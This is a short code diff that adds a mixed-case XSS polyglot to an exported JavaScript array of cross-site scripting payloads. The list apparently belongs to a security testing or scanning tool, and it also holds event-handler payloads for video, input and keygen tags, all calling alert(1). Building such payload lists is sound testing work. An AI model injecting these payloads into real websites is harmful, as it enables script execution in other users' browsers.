@@ -43,4 +43,5 @@ export const PAYLOADS = [
   `<video onloadstart=alert(1)><source>`,
   `<input autofocus onblur=alert(1)>`,
   `<keygen autofocus onfocus=alert(1)>`,
+  `jaVasCript:/*-/*\`/*\\\`/*'/*"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>\\x3e`,
 ]
